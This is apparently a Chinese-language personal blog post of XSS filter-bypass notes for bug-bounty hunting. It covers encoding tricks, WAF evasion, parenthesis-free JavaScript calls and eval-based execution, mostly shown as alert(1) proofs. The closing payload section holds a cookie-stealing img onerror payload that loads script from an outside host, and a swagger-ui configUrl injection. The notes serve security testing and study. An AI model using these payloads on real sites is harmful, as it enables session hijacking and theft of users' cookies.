---
layout:     post   				    # 使用的布局（不需要改）
title:      xss 				    # 标题
categories: SRC                        # 分类 
date:       2024-11-26 				# 时间
author:     z1 						# 作者
catalog: true 						# 是否归档
tags:								#标签
    - src
    - xss
description: XSS漏洞挖掘技巧
---
# XSS漏洞

## 1. XSS绕过 -- 标签/属性

### 1. 转义绕过

```html
  <h1>
      a
  </h1>
```

- 这种简单标签无法解析，说明<>被html实体编码为 `&lt`, `&gt`, 可以尝试url编码(对<和>进行url编码)， 或url双编码

```html
<input name="keyword" name="1234">
```
value的值如果有特殊字符，就会被实体化，此时可用onfocus绕过

```html
<input name="keyword" value='' onfocus="javascript:alert(1)" ''>
```

### 2. 属性内容回HTML实体编码绕过

*注意：实体编码只能属于**属性内容**，也就是如下位置*

```html
<img src=1 onerror="alert(1)" />
```

如果想要使用 `alert(1)` ,但是被拦截了，就可以用实体编码：

1. 先进行HTML实体编码
2. 再将html实体编码后的内容进行url编码（&在url中会被识别为参数分隔符）

### 3. 类双写绕过删除过滤

有的过滤是直接删除，可以用类双写绕过waf

- 例如waf对，多个关键字进行了删除过滤
  - `on<script>load=`
  - 过滤删除`<script>`,剩下`onload`

### 4. ***<u>fuzz进行bypass(重点)</u>***

使用burp爆破未检测的标签和属性

[Cross-Site Scripting (XSS) Cheat Sheet - 2024 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

1. 先跑可用属性
2. 再找对应标签来触发该属性

### 5. 常用标签和属性

```html
<img src=1 onerror=alert(1)>
<img src="https://www.baidu.com/favicon.ico" onload=alert(1)>
<svg onload=alert(1)>  <!-- dom 无法使用 -->
<video src="正常视频" oncanplay=alert(1)>
<input autofocus onfocus=alert(1)>  <!-- 自动聚焦到当前元素，导致执行-->
<a id=x tabindex=1 autofocus onfocus=alert(1) href=1 >
```

## 2. XSS绕过 -- JS技巧

如果可以绕过属性，标签，但是无法弹框或者跳转等方式被拦截，即 `alert()` 被拦截

### 1. unicode编码绕过（不用加引号）

js中的字母会自动进行unicode解码，可以用unicode绕过

alert(1) -> \u0061\u006c\u0065\u0072\u0074(1)

### 2. JS8/ascii 编码绕过（需要加引号）

JS中的字符串可以用 `JS8/ascii` 编码绕过关键字过滤

ascii: alert(1) -> \x61\x6C\x65\x72\x74

js8:    alert(1) -> \141\154\145\162\164\50\61\51

### 3. 平替window对象的几个全局函数

```js
window.alert(1) //window指浏览器页面
this.alert(1)  //this只想当前窗口
parent.alert(1)  //也可平替window对象
self.alert(1)
frames.alert(1)
top.alert(1)
```

这些方式的作用

JS中访问对象有多种方式：

```js
window.alert(1)  //这样的alert(1)是代码，只能进行unicode编码
window['alert'](1)  //这样的alert是字符串，可以进行JS8和ascii编码
//或者进行分割
window['ale'+'rt'](1)
//或进行拼接
window['al'.concat('ert')](1)
//纯数字，利用ascii的10进制编码
window[String.fromCharCode(97,108,101,114,116)](1)
```

### 4. 无括号调用函数(***括号被过滤时使用***)

1. 反引号

   ```js
    `${alert(1)}`  //模板字符串
    //延申用法
    alert `1`
   ```

2. Symbol.hasInstanceof

   ```js
   //需要引号
   class A{static [Symbol.hasInstance]=eval}; 'alert\x281\x29' instanceof A
   'alert\x281\x29' instanceof {[Symbol.hasInstance]:eval}
   ```

    `instanceof` 是运算符，用于判断左操作数是不是右操作数的实例    

   `Symbol.hasInstance`指向一个函数, `eval`，用于自定义对象在`instanceof`运算时的行为，即指定使用哪个函数来检查左操作数是不是右操作数的实例    

   这里``Symbol.hasInstance``函数并没有指向函数，而是指向了 `eval` 

   而 `eval` 是一个全局函数用于执行字符串中的 JavaScript 代码    

   即使用 `eval` 函数来检查 `alert(1)` 是否是有操作数的实例，自然就造成了弹框        

   这里的''内的东西用的ascii，用JS8也可以

### 5. 字符串转代码

```js
1. eval					eval("alert(1)")
2. setTimeout     setTimeout("alert(1)", 0)
3. setInterval      setInterval("alert(1)",999)
4. 匿名函数          (()=>{alert(1)})``	
							(()=>{alert(1)})()
5. 署名函数          Function("alert(1)")``	
							Function("alert(1)")()
6. 原型链              "".at.constructor("alert(1)")()	
							""['at']['constructor']("alert(1)")()  //可以换种方式访问对象，全部转化为字符串
7. Symbol.hasInstanceof
```

### 6. base64过滤关键字

```js
btoa('alert(1)')   //编码
atob('YWxlcnQoMSk=')   //解码
eval(atob('YWxlcnQoMSk='))
```

***同样，也可以换成ascii和JS8编码绕过***

### 7. 弱类型

js是弱类型语言，会进行类型转换，所以就延伸了下面这一种绕过方式

JSFUCK

[JSFuck - Write any JavaScript with 6 Characters: []()!+](https://jsfuck.com/)

## 3. 特殊情况

- 闭合引号后，等号被删除，即不允许使用属性

  - 闭合标签

- 双引号被转义

  - `<input xxx value="\\\" onload=xxx \"">`

    结果<input xxx value="\\\" onload=xxx \"">

## XSS payload

- xss-img-cookie:

  ```html
  <img src=1 onerror='s==document.createElement(`script`);s.src=`https://xxx/cookie.js`;document.body.appendChild(s)'>
  ```

- swagger-ui xss

  ```txt
  ?configUrl=https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/config.json
  ```

  


